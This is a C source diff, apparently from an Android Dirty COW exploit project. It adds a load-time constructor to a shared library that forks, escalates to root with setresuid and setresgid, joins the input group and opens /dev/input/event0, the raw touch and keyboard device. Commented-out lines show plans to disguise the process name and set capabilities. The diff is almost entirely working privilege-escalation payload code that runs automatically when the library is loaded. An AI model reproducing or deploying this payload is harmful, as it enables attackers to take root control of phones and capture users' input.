@@ -5,6 +5,8 @@
 #include <unistd.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <fcntl.h>
+#include <sys/wait.h>
 
 #include <dlfcn.h>
 
@@ -16,6 +18,79 @@
 #else
 #define LOGV(...)
 #endif
+
+#define PROC_NAME "leyfer_input_r"
+
+__attribute__((constructor)) void say_hello()
+{
+
+  __android_log_print(ANDROID_LOG_INFO, "dirtycow", "%d: hi (%d)", getpid(), getuid());
+
+  int orig_pid = getpid();
+  pid_t pid = fork();
+  if (pid == 0)
+  {
+    __android_log_print(ANDROID_LOG_INFO, "dirtycow", "fork %d->%d", pid, orig_pid);
+
+    // if (system("/system/bin/sh ps | grep " PROC_NAME) == -1)
+    if (1)
+    {
+      // __android_log_print(ANDROID_LOG_INFO, "dirtycow", "No " PROC_NAME " found.");
+      // if (prctl(PR_SET_NAME, PROC_NAME, 0, 0, 0) != 0)
+      // {
+      //   __android_log_print(ANDROID_LOG_INFO, "dirtycow", "Unable to set proc name: %s!", strerror(errno));
+      // }
+
+      if (getuid() != 0)
+      {
+//        struct __user_cap_header_struct capheader;
+//        struct __user_cap_data_struct capdata[2];
+
+        __android_log_print(ANDROID_LOG_INFO, "dirtycow", "running as uid %d\n", getuid());
+
+//        memset(&capheader, 0, sizeof(capheader));
+//        memset(&capdata, 0, sizeof(capdata));
+//        capheader.version = _LINUX_CAPABILITY_VERSION_3;
+//        capdata[CAP_TO_INDEX(CAP_SETUID)].effective |= CAP_TO_MASK(CAP_SETUID);
+//        capdata[CAP_TO_INDEX(CAP_SETGID)].effective |= CAP_TO_MASK(CAP_SETGID);
+//        capdata[CAP_TO_INDEX(CAP_SETUID)].permitted |= CAP_TO_MASK(CAP_SETUID);
+//        capdata[CAP_TO_INDEX(CAP_SETGID)].permitted |= CAP_TO_MASK(CAP_SETGID);
+//        if (capset(&capheader, &capdata[0]) < 0) {
+//          __android_log_print(ANDROID_LOG_INFO, "dirtycow", "Could not set capabilities: %s\n", strerror(errno));
+//        }
+
+        if(setresgid(0,0,0) || setresuid(0,0,0)) {
+          __android_log_print(ANDROID_LOG_INFO, "dirtycow", "setresgid/setresuid failed\n");
+          exit(0);
+        }
+
+        gid_t groups[] = { 1004 }; //input
+        if (setgroups(sizeof(groups)/sizeof(groups[0]), groups) != 0) {
+          __android_log_print(ANDROID_LOG_INFO, "dirtycow", "Unable to set groups: %s", strerror(errno));
+          exit(0);
+        }
+      }
+
+      if (getuid() == 0)
+      {
+        __android_log_print(ANDROID_LOG_INFO, "dirtycow", "Got root");
+        int fd = -1;
+        if ((fd = open("/dev/input/event0", O_RDONLY)) == -1)
+        {
+          __android_log_print(ANDROID_LOG_INFO, "dirtycow", "Unable to open input device: %s", strerror(errno));
+        }
+        else
+        {
+          __android_log_print(ANDROID_LOG_INFO, "dirtycow", "Open input device success!");
+          close(fd);
+        }
+      }
+    }
+
+    exit(0);
+  }
+}
+
 
 //reduce binary size
 char __aeabi_unwind_cpp_pr0[0];
